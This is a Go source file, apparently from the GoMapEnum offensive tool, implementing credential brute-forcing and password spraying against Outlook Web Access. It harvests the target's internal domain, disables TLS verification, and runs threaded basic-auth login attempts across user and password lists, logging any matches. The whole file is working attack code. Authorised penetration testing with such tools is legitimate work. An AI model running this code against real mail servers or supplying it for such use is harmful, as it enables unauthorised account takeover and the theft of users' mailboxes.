package owa

import (
	"GoMapEnum/src/utils"
	"crypto/tls"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

func (options *Options) Brute() {
	log = options.Log
	var emailList []string
	var wg sync.WaitGroup
	if options.CheckIfValid {
		optionsEnum := *options
		// Use office for enumeration
		emailList = (&optionsEnum).UserEnum()
	} else {
		options.Users = utils.GetStringOrFile(options.Users)
		emailList = strings.Split(options.Users, "\n")
	}
	options.Passwords = utils.GetStringOrFile(options.Passwords)
	passwordList := strings.Split(options.Passwords, "\n")

	queue := make(chan string)
	// Prepare the transport for all the requests
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           options.Proxy,
	}
	options.tr = tr
	urlToHarvest := options.getURIToAuthenticate(options.Target)
	internaldomain := options.harvestInternalDomain(urlToHarvest)
	log.Info("Internal Domain: " + internaldomain)

	for i := 0; i < options.Thread; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			var j = 0
			for email := range queue {
				if options.Sleep != 0 {
					options.Log.Debug("Sleep " + strconv.Itoa(options.Sleep) + " seconds")
					time.Sleep(time.Duration(options.Sleep) * time.Second)
				}
				if options.NoBruteforce {
					if webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+email, passwordList[j], tr) == 200 {
						log.Success(email + " / " + passwordList[j] + " matched")

					} else {
						log.Fail(email + " / " + passwordList[j] + " does not matched")
					}

				} else {
					for _, password := range passwordList {
						if webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+email, password, tr) == 200 {
							log.Success(email + " / " + password + " matched")
							break // No need to continue if password is valid
						}
						log.Fail(email + " / " + password + " does not matched")

					}
				}
				j++
			}

		}(i)
	}

	// Trim emails and send them to the pool of workers
	for _, email := range emailList {
		email = strings.ToValidUTF8(email, "")
		email = strings.Trim(email, "\r")
		email = strings.Trim(email, "\n")
		queue <- email
	}

	close(queue)
	wg.Wait()

}
